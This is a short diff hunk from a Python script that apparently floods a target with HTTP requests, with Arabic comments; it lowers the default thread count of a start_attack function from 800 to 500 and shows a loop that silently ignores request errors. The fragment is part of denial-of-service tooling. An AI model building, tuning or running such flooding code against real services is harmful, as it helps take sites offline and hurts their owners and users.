@@ -39,7 +39,7 @@ def send_requests(target):
         except requests.exceptions.RequestException:
             pass  # تجاهل جميع الأخطاء دون طباعة أي رسائل
 
-def start_attack(target, num_threads=800):
+def start_attack(target, num_threads=500):
     """بدء الهجوم باستخدام عدد من الخيوط."""
     global stop_attack_flag
     stop_attack_flag = False
